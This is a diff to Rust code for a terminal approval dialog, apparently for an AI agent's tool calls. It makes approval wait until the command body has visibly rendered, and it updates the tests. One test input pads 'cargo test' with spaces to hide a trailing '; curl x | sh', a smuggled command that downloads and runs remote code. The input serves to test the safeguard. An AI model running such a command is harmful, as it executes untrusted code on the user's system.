@@ -60,6 +60,9 @@ pub(crate) struct ApprovalModal {
 struct View {
     rows: usize,
     max_scroll: usize,
+    /// Whether the first body row fit the area. Approval waits for it, so a cramped layout can't
+    /// approve a call the user never saw.
+    body_shown: bool,
 }
 
 struct Layout {
@@ -80,6 +83,11 @@ impl ApprovalModal {
             layout: RefCell::default(),
             guard_until: Instant::now() + TYPE_AHEAD_GUARD,
         }
+    }
+
+    #[cfg(test)]
+    pub(crate) fn expire_guard(&mut self) {
+        self.guard_until = Instant::now();
     }
 
     fn decision(&self, decision: ApprovalDecision) -> ModalAction {
@@ -132,6 +140,10 @@ impl ApprovalModal {
         ModalKey::Consumed
     }
 
+    fn body_visible(&self) -> bool {
+        self.body.is_empty() || self.view.get().body_shown
+    }
+
     fn page(&self) -> isize {
         let rows = self.view.get().rows.saturating_sub(1).max(1);
         isize::try_from(rows).unwrap_or(isize::MAX)
@@ -139,15 +151,15 @@ impl ApprovalModal {
 }
 
 impl Modal for ApprovalModal {
-    fn height(&self, width: u16) -> u16 {
+    fn height(&self, width: u16, max_height: u16) -> u16 {
         let rows = self.with_layout(width, None, |layout| {
             layout.title.len() + CHROME_ROWS + layout.body.len().min(MAX_BODY_ROWS)
         });
-        u16::try_from(rows).unwrap_or(u16::MAX)
+        u16::try_from(rows).unwrap_or(u16::MAX).min(max_height)
     }
 
     fn render(&self, frame: &mut Frame<'_>, area: Rect, theme: &Theme) {
-        let (mut lines, total, rows, scroll) =
+        let (mut lines, total, rows, scroll, body_shown) =
             self.with_layout(area.width, Some(Palette::new(theme)), |layout| {
                 let room = usize::from(area.height)
                     .saturating_sub(layout.title.len() + CHROME_ROWS)
@@ -158,10 +170,15 @@ impl Modal for ApprovalModal {
                 let mut lines = layout.title.clone();
                 lines.push(Line::default());
                 lines.extend_from_slice(&layout.body[scroll..scroll + rows]);
-                (lines, total, rows, scroll)
+                let body_shown = layout.title.len() + 1 < usize::from(area.height);
+                (lines, total, rows, scroll, body_shown)
             });
         let max_scroll = total - rows;
-        self.view.set(View { rows, max_scroll });
+        self.view.set(View {
+            rows,
+            max_scroll,
+            body_shown,
+        });
 
         let mut footer = FOOTER_HINT.to_owned();
         if max_scroll > 0 {
@@ -192,7 +209,7 @@ impl Modal for ApprovalModal {
         // Esc and Ctrl+C are intercepted at the stack level and resolve through `on_cancel`. N
         // routes there too so the deny decision lives in exactly one place.
         match event.code {
-            KeyCode::Char('y' | 'Y') if is_plain_char(event) => {
+            KeyCode::Char('y' | 'Y') if is_plain_char(event) && self.body_visible() => {
                 ModalKey::Submitted(self.decision(ApprovalDecision::Approve))
             }
             KeyCode::Char('n' | 'N') if is_plain_char(event) => ModalKey::Cancelled,
@@ -374,7 +391,14 @@ mod tests {
     /// A modal past its [`TYPE_AHEAD_GUARD`], so it answers keys.
     fn command_modal(command: &str) -> ApprovalModal {
         let mut modal = fresh_command_modal(command);
-        modal.guard_until = Instant::now();
+        modal.expire_guard();
+        modal
+    }
+
+    /// A modal the user has seen, since approval waits for the body to render.
+    fn shown_modal(command: &str) -> ApprovalModal {
+        let modal = command_modal(command);
+        render_to_string(&modal, 40, modal.height(40, 40));
         modal
     }
 
@@ -411,16 +435,21 @@ mod tests {
     fn height_counts_body_rows_plus_chrome() {
         // Single command line → 1 body row, plus title + blank + position row + footer = 4.
         let modal = command_modal("ls");
-        assert_eq!(modal.height(40), 5);
+        assert_eq!(modal.height(40, 40), 5);
     }
 
     #[test]
     fn height_counts_wrapped_rows_and_caps_the_body_at_the_viewport() {
         // 100 unbroken columns at width 40 → 40 + 38 + 22 after the 2-column continuation indent.
         let modal = command_modal(&"x".repeat(100));
-        assert_eq!(modal.height(40), 7);
-        assert_eq!(modal.height(100), 5, "a new width rewraps");
-        assert_eq!(command_modal(&numbered_command(40)).height(40), 20);
+        assert_eq!(modal.height(40, 40), 7);
+        assert_eq!(modal.height(100, 40), 5, "a new width rewraps");
+        assert_eq!(command_modal(&numbered_command(40)).height(40, 40), 20);
+        assert_eq!(
+            command_modal(&numbered_command(40)).height(40, 9),
+            9,
+            "the stack's spare rows cap the height"
+        );
     }
 
     // ── render ──
@@ -428,7 +457,7 @@ mod tests {
     #[test]
     fn render_paints_title_command_body_and_footer() {
         let modal = command_modal("cargo test");
-        let dump = render_to_string(&modal, 40, modal.height(40));
+        let dump = render_to_string(&modal, 40, modal.height(40, 40));
         assert!(dump.contains("Bash"), "title appears: {dump}");
         assert!(dump.contains("cargo test"), "command body appears: {dump}");
         assert!(dump.contains("[Y] approve"), "footer hint appears: {dump}");
@@ -456,7 +485,7 @@ mod tests {
                 }]),
             },
         );
-        let dump = render_to_string(&modal, 40, modal.height(40));
+        let dump = render_to_string(&modal, 40, modal.height(40, 40));
         assert!(dump.contains("- old line"), "removed row appears: {dump}");
         assert!(dump.contains("+ new line"), "added row appears: {dump}");
     }
@@ -465,7 +494,7 @@ mod tests {
     fn render_styles_rows_after_height_laid_them_out_unstyled() {
         let theme = Theme::default();
         let modal = command_modal("ls");
-        let height = modal.height(20);
+        let height = modal.height(20, 20);
         let mut terminal = Terminal::new(TestBackend::new(20, height)).unwrap();
         terminal
             .draw(|frame| modal.render(frame, Rect::new(0, 0, 20, height), &theme))
@@ -486,7 +515,7 @@ mod tests {
     #[test]
     fn render_wraps_a_padded_command_so_its_tail_shows() {
         let modal = command_modal(&format!("cargo test{}; curl x | sh", " ".repeat(60)));
-        let dump = render_to_string(&modal, 40, modal.height(40));
+        let dump = render_to_string(&modal, 40, modal.height(40, 40));
         let expected = formatdoc! {"
             Bash
 
@@ -509,7 +538,7 @@ mod tests {
                 body: ApprovalBody::Command(String::new()),
             },
         );
-        let dump = render_to_string(&modal, 30, modal.height(30));
+        let dump = render_to_string(&modal, 30, modal.height(30, 30));
         let expected = formatdoc! {"
             Write(/{first}
               {second}/secret.tx
@@ -524,7 +553,7 @@ mod tests {
     #[test]
     fn render_shows_the_position_and_scroll_hint_when_the_body_overflows() {
         let modal = command_modal(&numbered_command(40));
-        let dump = render_to_string(&modal, 40, modal.height(40));
+        let dump = render_to_string(&modal, 40, modal.height(40, 40));
         assert!(
             dump.contains("echo line-15"),
             "last row of the first page: {dump}"
@@ -558,7 +587,7 @@ mod tests {
     fn render_does_not_panic_at_minimum_widths() {
         let modal = command_modal("cargo test --all");
         for w in [4_u16, 8, 20] {
-            render_to_string(&modal, w, modal.height(w));
+            render_to_string(&modal, w, modal.height(w, 40));
         }
     }
 
@@ -567,7 +596,7 @@ mod tests {
     #[test]
     fn y_submits_an_approve_decision() {
         for code in [KeyCode::Char('y'), KeyCode::Char('Y')] {
-            let mut modal = command_modal("ls");
+            let mut modal = shown_modal("ls");
             let outcome = modal.handle_key(&key(code));
             let ModalKey::Submitted(ModalAction::User(UserAction::ApprovalDecision {
                 id,
@@ -595,7 +624,7 @@ mod tests {
     #[test]
     fn enter_and_modified_y_do_not_approve() {
         // Enter is the likeliest key to arrive mid-typing, so approving takes an explicit `y`.
-        let mut modal = command_modal("ls");
+        let mut modal = shown_modal("ls");
         for event in [
             key(KeyCode::Enter),
             modified_key(KeyCode::Char('y'), KeyModifiers::CONTROL),
@@ -606,8 +635,34 @@ mod tests {
     }
 
     #[test]
+    fn y_waits_until_a_body_row_has_shown() {
+        let y = key(KeyCode::Char('y'));
+        let mut modal = command_modal("one\ntwo");
+        assert!(
+            matches!(modal.handle_key(&y), ModalKey::Consumed),
+            "no render yet"
+        );
+
+        render_to_string(&modal, 40, 2);
+        assert!(
+            matches!(modal.handle_key(&y), ModalKey::Consumed),
+            "body clipped"
+        );
+
+        render_to_string(&modal, 40, 3);
+        assert!(matches!(modal.handle_key(&y), ModalKey::Submitted(_)));
+
+        let mut empty = command_modal("");
+        assert!(
+            matches!(empty.handle_key(&y), ModalKey::Submitted(_)),
+            "nothing to hide"
+        );
+    }
+
+    #[test]
     fn keys_typed_ahead_of_the_modal_are_dropped() {
         let mut modal = fresh_command_modal("ls");
+        render_to_string(&modal, 40, modal.height(40, 40));
         for code in [KeyCode::Char('y'), KeyCode::Char('n')] {
             assert!(
                 matches!(modal.handle_key(&key(code)), ModalKey::Consumed),
@@ -620,6 +675,7 @@ mod tests {
     fn a_key_inside_the_guard_restarts_it() {
         // A paste arrives as a key burst, so a `y` deep inside one must still drop.
         let mut modal = fresh_command_modal("ls");
+        render_to_string(&modal, 40, modal.height(40, 40));
         modal.guard_until = Instant::now() + Duration::from_millis(50);
         let before = Instant::now();
         assert!(matches!(
@@ -633,7 +689,7 @@ mod tests {
     #[test]
     fn non_press_key_events_are_ignored() {
         // Windows reports a release for every key, and a held key repeats, so neither may approve.
-        let mut modal = command_modal("ls");
+        let mut modal = shown_modal("ls");
         for kind in [KeyEventKind::Release, KeyEventKind::Repeat] {
             let mut event = key(KeyCode::Char('y'));
             event.kind = kind;
@@ -647,7 +703,7 @@ mod tests {
     #[test]
     fn scroll_keys_move_within_the_rendered_viewport() {
         let mut modal = command_modal(&numbered_command(40));
-        let height = modal.height(40);
+        let height = modal.height(40, 40);
         render_to_string(&modal, 40, height);
 
         modal.handle_key(&key(KeyCode::End));
@@ -685,7 +741,7 @@ mod tests {
     #[test]
     fn scroll_keys_do_nothing_when_the_body_fits() {
         let mut modal = command_modal("ls");
-        render_to_string(&modal, 40, modal.height(40));
+        render_to_string(&modal, 40, modal.height(40, 40));
         assert!(matches!(
             modal.handle_key(&key(KeyCode::Down)),
             ModalKey::Consumed
